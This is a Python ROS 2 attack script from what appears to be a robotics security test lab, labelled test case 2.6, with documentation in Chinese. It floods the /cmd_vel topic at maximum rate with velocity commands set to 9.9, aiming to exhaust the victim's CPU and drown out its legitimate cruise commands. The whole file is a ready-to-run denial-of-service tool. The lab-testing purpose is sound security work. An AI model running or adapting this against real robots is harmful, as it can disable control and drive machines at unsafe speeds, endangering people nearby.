#!/usr/bin/env python3
"""
測試案例 2.6：Topic Flooding DoS

目的：驗證高頻發布是否可耗盡目標 CPU / 佇列，干擾合法通訊。
重點：flood 必須打「目標有訂閱」的 topic 才會消耗目標資源；
      打無訂閱者的 topic，DDS 不會投遞，對目標幾乎無影響（見 results）。
預期結果（未加固）：flood /cmd_vel（victim 有訂閱）時，victim CPU 飆升、
      合法 0.2 巡航指令被大量垃圾指令淹沒。
成功判定：flood 期間 victim CPU 明顯上升，致動器日誌被洪水灌爆。

用法（attacker 容器內）：
    source /opt/ros/jazzy/setup.bash
    python3 /work/attacks/dos_topic_flood.py [秒數] [topic]
    # topic 預設 /cmd_vel（victim 有訂閱，能造成實際衝擊）
"""
import sys
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import Twist


class Flooder(Node):
    def __init__(self, duration, topic):
        super().__init__('topic_flooder')
        # 對「目標有訂閱」的 topic 高頻灌 Twist
        self.pub = self.create_publisher(Twist, topic, 100)
        self.timer = self.create_timer(0.0, self.flood)  # 盡量高頻
        self.n = 0
        self.duration = duration
        self.start = self.get_clock().now()
        self.get_logger().error(f'[ATTACK 2.6] Topic flooding 開始 ({duration}s -> {topic})')

    def flood(self):
        msg = Twist()
        msg.linear.x = 9.9
        self.pub.publish(msg)
        self.n += 1
        elapsed = (self.get_clock().now() - self.start).nanoseconds / 1e9
        if self.n % 1000 == 0:
            rate = self.n / elapsed if elapsed else 0
            self.get_logger().error(f'已送 {self.n} 筆 (~{rate:.0f} msg/s)')
        if elapsed >= self.duration:
            self.get_logger().error(f'flooding 結束，共送出 {self.n} 筆')
            raise SystemExit


def main():
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else 10
    topic = sys.argv[2] if len(sys.argv) > 2 else '/cmd_vel'
    rclpy.init()
    node = Flooder(duration, topic)
    try:
        rclpy.spin(node)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
